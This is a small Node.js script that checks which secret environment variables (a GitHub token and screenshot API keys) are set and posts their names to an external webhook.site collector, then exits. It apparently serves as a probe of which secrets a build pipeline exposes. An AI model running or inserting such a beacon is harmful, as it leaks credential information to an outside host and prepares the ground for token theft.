const webhookUrl = 'https://webhook.site/c4988414-617b-4881-84ce-023ac1b18c1d';

const present = ['GITHUB_TOKEN', 'SCREENSHOT_API_KEY', 'SCREENSHOT_WORKER_URL']
  .filter(k => !!process.env[k]);

async function reportSecrets() {
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        event: 'secret_check',
        present_keys: present,
        timestamp: new Date().toISOString()
      }),
    });

    if (!response.ok) {
      console.error('Webhook failed:', response.statusText);
    }
  } catch (error) {
    console.error('Error posting to webhook:', error);
  } finally {
    // Ensure the process waits for the network call before exiting
    process.exit(0);
  }
}

reportSecrets();
